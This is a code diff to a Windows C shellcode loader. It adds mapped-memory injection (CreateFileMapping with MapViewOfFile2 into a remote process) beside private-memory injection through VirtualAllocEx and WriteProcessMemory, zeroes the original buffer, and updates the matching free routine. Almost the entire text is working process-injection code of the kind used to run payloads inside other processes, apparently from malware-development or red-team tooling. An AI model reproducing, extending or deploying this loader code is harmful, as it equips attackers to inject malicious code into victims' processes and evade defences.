@@ -6,6 +6,8 @@
 #include "Common.h"
 #include "Structs.h"
 
+#pragma comment (lib, "OneCore.lib") // Required for MapViewOfFile2
+
 BOOL ReportErrorWinAPI(char* ApiName)
 {
 	printf("[!] \"%s\" WinAPI Failed with Error : %d\n", ApiName, GetLastError());
@@ -40,36 +42,85 @@ BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput)
 	return TRUE;
 }
 
-BOOL AllocateMemory(IN HANDLE hProcess, IN PVOID pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pShellcodeAddr)
+BOOL AllocateMemory(IN DWORD dwType, IN HANDLE hProcess, IN PVOID pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pShellcodeAddr)
 {
-	DWORD oldProtect;
+	if (dwType == NULL)
+		dwType = PRIVATE;
 
-	// Local allocation
-	if (hProcess == NULL)
+	if (dwType == PRIVATE)
 	{
-		if ((*pShellcodeAddr = VirtualAlloc(NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
-			return ReportErrorWinAPI("VirtualAlloc");
-		memcpy(*pShellcodeAddr, pShellcode, sShellcodeSize);
-		memset(pShellcode, '\0', sShellcodeSize);
-		if (!VirtualProtect(*pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
-			return ReportErrorWinAPI("VirtualProtect");
+		DWORD oldProtect;
+
+		// Local allocation
+		if (hProcess == NULL)
+		{
+			if ((*pShellcodeAddr = VirtualAlloc(NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
+				return ReportErrorWinAPI("VirtualAlloc");
+			memcpy(*pShellcodeAddr, pShellcode, sShellcodeSize);
+			memset(pShellcode, '\0', sShellcodeSize);
+			if (!VirtualProtect(*pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtect");
+		}
+
+		// Remote allocation
+		else
+		{
+			SIZE_T bytesWritten;
+
+			if ((*pShellcodeAddr = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
+				return ReportErrorWinAPI("VirtualAllocEx");
+			if (!WriteProcessMemory(hProcess, *pShellcodeAddr, pShellcode, sShellcodeSize, &bytesWritten))
+				return ReportErrorWinAPI("WriteProcessMemory");
+			memset(pShellcode, '\0', sShellcodeSize);
+			if (!VirtualProtectEx(hProcess, *pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtectEx");
+		}
+
+		printf("[i] Allocated private memory for shellcode at 0x%p\n", *pShellcodeAddr);
 	}
 
-	// Remote allocation
-	else
+	else if (dwType == MAPPED)
 	{
-		SIZE_T bytesWritten;
+		HANDLE hFile;
 
-		if ((*pShellcodeAddr = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
-			return ReportErrorWinAPI("VirtualAllocEx");
-		if (!WriteProcessMemory(hProcess, *pShellcodeAddr, pShellcode, sShellcodeSize, &bytesWritten))
-			return ReportErrorWinAPI("WriteProcessMemory");
+		if ((hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sShellcodeSize, NULL)) == NULL)
+			return ReportErrorWinAPI("CreateFileMapping");
+
+		// Local mapping injection
+		if (hProcess == NULL)
+		{
+			PVOID pMapLocalAddress;
+
+			if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sShellcodeSize)) == NULL)
+				return ReportErrorWinAPI("MapViewOfFile");
+
+			memcpy(pMapLocalAddress, pShellcode, sShellcodeSize);
+
+			*pShellcodeAddr = pMapLocalAddress;
+		}
+
+		// Remote mapping injection
+		else
+		{
+			PVOID pMapLocalAddress, pMapRemoteAddress;
+
+			if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sShellcodeSize)) == NULL)
+				return ReportErrorWinAPI("MapViewOfFile");
+
+			memcpy(pMapLocalAddress, pShellcode, sShellcodeSize);
+
+			if ((pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE)) == NULL)
+				return ReportErrorWinAPI("MapViewOfFile2");
+
+			*pShellcodeAddr = pMapRemoteAddress;
+		}
+
 		memset(pShellcode, '\0', sShellcodeSize);
-		if (!VirtualProtectEx(hProcess, *pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
-			return ReportErrorWinAPI("VirtualProtectEx");
-	}
 
-	printf("[i] Allocated memory for shellcode at 0x%p\n", *pShellcodeAddr);
+		printf("[i] Allocated mapped memory for shellcode at 0x%p\n", *pShellcodeAddr);
+
+		CloseHandle(hFile);
+	}
 
 	return TRUE;
 }
@@ -113,15 +164,24 @@ BOOL WaitForThread(IN HANDLE hThread)
 	return TRUE;
 }
 
-BOOL FreeMemory(IN HANDLE hProcess, IN PVOID pShellcode)
+BOOL FreeMemory(IN DWORD dwMemoryType, IN HANDLE hProcess, IN PVOID pShellcode)
 {
-	if (hProcess != NULL)
+	if (dwMemoryType == NULL)
+		dwMemoryType = PRIVATE;
+
+	if (dwMemoryType == PRIVATE)
 	{
-		VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
-		CloseHandle(hProcess);
+		if (hProcess != NULL)
+			VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
+		else
+			VirtualFree(pShellcode, 0, MEM_RELEASE);
 	}
-	else
-		VirtualFree(pShellcode, 0, MEM_RELEASE);
+
+	else if (dwMemoryType == MAPPED)
+		UnmapViewOfFile(pShellcode);
+
+	if (hProcess != NULL)
+		CloseHandle(hProcess);
 
 	return TRUE;
 }
